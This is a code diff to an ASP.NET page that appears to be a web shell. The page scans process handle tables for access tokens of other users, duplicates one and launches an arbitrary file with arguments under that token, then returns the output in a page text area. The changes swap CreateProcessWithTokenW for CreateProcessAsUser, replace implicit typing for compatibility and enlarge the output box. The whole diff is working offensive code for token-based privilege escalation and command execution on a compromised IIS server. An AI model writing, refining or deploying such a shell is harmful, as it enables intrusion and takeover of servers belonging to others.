@@ -2,6 +2,7 @@
 <%@ Import Namespace="System.IO" %>
 <%@ Import Namespace="System.Collections" %>
 <%@ Import Namespace="System.Text.RegularExpressions" %>
+<%@ Import Namespace="System.Collections.Generic" %>
 <%@ Page Language="c#"%>
 
 <script runat="server">
@@ -239,9 +240,6 @@
 	[DllImport("ntdll.dll", SetLastError = true)]
 	public static extern int NtQueryInformationProcess(IntPtr processHandle, uint processInformationClass, IntPtr processInformation, int processInformationLength, ref int returnLength);
 
-	[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
-	public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, string lpApplicationName, string lpCommandLine, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-
 	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
 	public static extern bool LookupAccountSid(
 	    [MarshalAs(UnmanagedType.LPTStr)] string strSystemName,
@@ -251,6 +249,9 @@
 	    System.Text.StringBuilder pReferencedDomainName,
 	    ref uint cchReferencedDomainName,
 	    out SID_NAME_USE peUse);
+		
+	[DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
+	public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
 	protected void RunThings (object sender, EventArgs e)
 	{
@@ -265,11 +266,11 @@
 			return;
 		}
 
-	    var dwTokenRights = 395U;
-	    var hPrimaryToken = IntPtr.Zero;
-	    var securityAttr = new SECURITY_ATTRIBUTES();
-	    var si = new STARTUPINFO();
-	    var pi = new PROCESS_INFORMATION();
+	    uint dwTokenRights = 395U;
+	    IntPtr hPrimaryToken = IntPtr.Zero;
+	    SECURITY_ATTRIBUTES securityAttr = new SECURITY_ATTRIBUTES();
+	    STARTUPINFO si = new STARTUPINFO();
+	    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
 	    SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
 	    saAttr.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
 	    saAttr.bInheritHandle = 0x1;
@@ -315,7 +316,7 @@
 	        return;
 	    }
 
-	    if (!CreateProcessWithTokenW(hPrimaryToken, 0, file, String.Concat(" ", args), CreationFlags.NoConsole, IntPtr.Zero, Path.GetDirectoryName(file), ref si, out pi))
+		if (!CreateProcessAsUser(hPrimaryToken, file, String.Concat(" ", args), IntPtr.Zero, IntPtr.Zero, true, CreationFlags.NoConsole, IntPtr.Zero, Path.GetDirectoryName(file), ref si, out pi))
 	    {		
 	    	Response.Write("Error: " + Marshal.GetLastWin32Error());
 			CloseHandle(hPrimaryToken);
@@ -358,7 +359,7 @@
 	    {
 	        for (int index = 1; index < 1000000; index++)
 	        {
-	            var handle = new IntPtr(index);
+	            IntPtr handle = new IntPtr(index);
 	            IntPtr hObjectName = IntPtr.Zero;
 	            try
 	            {
@@ -379,7 +380,7 @@
 	                    status = NtQueryObject(handle, (int)OBJECT_INFORMATION_CLASS.ObjectTypeInformation, hObjectName, nLength, ref nLength);
 	                }
 
-	                OBJECT_TYPE_INFORMATION objObjectName = Marshal.PtrToStructure<OBJECT_TYPE_INFORMATION>(hObjectName);
+			OBJECT_TYPE_INFORMATION objObjectName = (OBJECT_TYPE_INFORMATION)Marshal.PtrToStructure(hObjectName, typeof(OBJECT_TYPE_INFORMATION));
 
 	                if (objObjectName.Name.Buffer != IntPtr.Zero)
 	                {
@@ -423,7 +424,7 @@
 
 	                            if (err == NO_ERROR)
 	                            {
-	                                var userName = referencedDomainName.ToString().ToLower() + "\\" + name.ToString().ToLower();
+	                                string userName = referencedDomainName.ToString().ToLower() + "\\" + name.ToString().ToLower();
 	                                IntPtr tokenInformation = Marshal.AllocHGlobal(8);
 
 	                                result = GetTokenInformation(handle, TOKEN_INFORMATION_CLASS.TokenOrigin, tokenInformation, 8, out tokenInfLen);
@@ -515,7 +516,7 @@
 </style>
 
     <div class="justified">
-        <textarea id="ResponseArea" runat="server" rows="10" cols="100" style="width: 733px; height: 173px;"></textarea>
+        <textarea id="ResponseArea" runat="server" rows="10" cols="100" style="width: 1000px; height: 1000px;"></textarea>
     </div>
     <br/>
     <div class ="justified">
